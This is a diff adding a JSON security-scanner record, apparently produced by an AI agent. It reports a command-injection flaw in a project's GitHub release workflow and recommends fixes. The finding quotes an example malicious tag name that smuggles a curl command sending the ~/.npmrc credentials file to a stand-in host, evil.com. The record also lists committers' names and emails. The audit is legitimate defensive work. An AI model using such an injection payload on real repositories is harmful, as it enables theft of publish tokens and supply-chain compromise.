@@ -1,0 +1,82 @@
+{
+  "filePath": ".github/workflows/release.yml",
+  "projectId": "cli",
+  "candidates": [
+    {
+      "vulnSlug": "github-workflow-security",
+      "lineNumbers": [
+        9,
+        69,
+        74,
+        168
+      ],
+      "snippet": "\npermissions:\n  id-token: write  # Required for OIDC trusted publishing\n  contents: write  # Required for creating GitHub releases\n",
+      "matchedPattern": "id-token: write (OIDC), secret reference"
+    }
+  ],
+  "lastScannedAt": "2026-05-18T13:27:55.995Z",
+  "lastScannedRunId": "20260518132755-84f586919cca3cc4",
+  "fileHash": "53f9e7e70acc51536ba7dd422022cbb48ebee4c485bbbf6ccc70383ba6dbca31",
+  "findings": [
+    {
+      "severity": "HIGH",
+      "vulnSlug": "github-workflow-security",
+      "title": "Command injection in release workflow via attacker-controlled git tag name (supply-chain RCE)",
+      "description": "The `publish` job interpolates tag-derived GitHub Actions expressions directly into multi-line `run:` shell scripts. L79 `CURRENT_TAG=${{ github.ref_name }}` injects the raw tag name, and L55/L82 `TAG_VERSION=${{ steps.version.outputs.version }}` / `VERSION=${{ steps.version.outputs.version }}` inject the `version` step output which is derived at L49 from the tag itself (`VERSION=${GITHUB_REF#refs/tags/v}`). Actions performs `${{ }}` substitution textually BEFORE the shell runs, so the tag name becomes literal shell source. Git ref-naming rules forbid spaces and a few metacharacters but PERMIT `;`, `$`, backtick, `(`, `)`, `|`, `&`, `{`, `}`, `<`, `>`. A tag such as `v1.0.0;curl${IFS}-d@$HOME/.npmrc${IFS}evil.com` (or backtick/`$()` variants, using `${IFS}` to avoid spaces) yields `CURRENT_TAG=v1.0.0;curl ... evil.com`, executing arbitrary commands. The `publish` job holds `id-token: write` (npm OIDC trusted publishing), `contents: write`, and environment access to `secrets.TEST_TOKEN` and `secrets.GITHUB_TOKEN`. Arbitrary code execution here means an attacker can publish a malicious `@formo/cli` to npm, exfiltrate the OIDC-minted npm publish token and `GITHUB_TOKEN`, and tamper with releases — a full supply-chain compromise of a published package. The earlier 'Verify tag is on main branch' step only checks `github.sha` ancestry (a hex SHA, not injectable) and does NOT validate the tag NAME, so it does not mitigate this: an attacker can point a maliciously-named tag at a legitimate main commit and the guard still passes. Precondition: ability to push/create a tag (repository write access; default GitHub has no tag-protection). This is a privilege escalation from 'write access' to 'arbitrary npm publish + OIDC/secret exfiltration', and is the canonical GitHub Actions script-injection anti-pattern (CWE-78) that GitHub explicitly warns against.",
+      "lineNumbers": [
+        49,
+        55,
+        79,
+        82
+      ],
+      "recommendation": "Never interpolate `${{ github.ref_name }}` or any tag/ref-derived value (including `steps.version.outputs.version`, which is computed from the tag) directly into a `run:` block. Pass them through the step's `env:` map and reference them as quoted shell variables, e.g.:\n\n  - name: Generate release notes\n    env:\n      CURRENT_TAG: ${{ github.ref_name }}\n      VERSION: ${{ steps.version.outputs.version }}\n    run: |\n      PREV_TAG=$(git tag -l 'v*' --sort=-version:refname | grep -v \"^${CURRENT_TAG}$\" | head -1)\n\nDo the same for the `TAG_VERSION` usage at L55. Environment-variable values are not re-parsed as shell, so injection is prevented. Additionally, harden the version regex (e.g. validate `github.ref_name` matches `^v[0-9]+\\.[0-9]+\\.[0-9]+([.-][0-9A-Za-z.]+)?$` and `exit 1` otherwise before any other step), and enable GitHub tag protection rules so only trusted maintainers can create `v*` tags.",
+      "confidence": "high",
+      "producedByRunId": "20260518132805-a5fd1949eb744d8b"
+    }
+  ],
+  "analysisHistory": [
+    {
+      "runId": "20260518132805-a5fd1949eb744d8b",
+      "investigatedAt": "2026-05-18T13:32:16.485Z",
+      "durationMs": 80847.33333333333,
+      "durationApiMs": 77802,
+      "agentType": "claude-agent-sdk",
+      "model": "claude-opus-4-7",
+      "modelConfig": {
+        "model": "claude-opus-4-7"
+      },
+      "agentSessionId": "2987151b-22c8-4aa8-97b4-670c195142f6",
+      "findingCount": 1,
+      "numTurns": 2.3333333333333335,
+      "phase": "process",
+      "costUsd": 0.29499000000000003,
+      "usage": {
+        "inputTokens": 2.6666666666666665,
+        "outputTokens": 5766.666666666667,
+        "cacheReadInputTokens": 45820,
+        "cacheCreationInputTokens": 20464
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+      }
+    }
+  ],
+  "status": "analyzed",
+  "gitInfo": {
+    "recentCommitters": [
+      {
+        "name": "Yos Riady",
+        "email": "1084226+yosriady@users.noreply.github.com",
+        "date": "2026-05-03T21:01:49+07:00"
+      },
+      {
+        "name": "ngogiahuandev",
+        "email": "ngogiahuan23122003@gmail.com",
+        "date": "2026-04-10T11:46:42+07:00"
+      }
+    ],
+    "enrichedAt": "2026-05-18T13:32:16.568Z"
+  }
+}
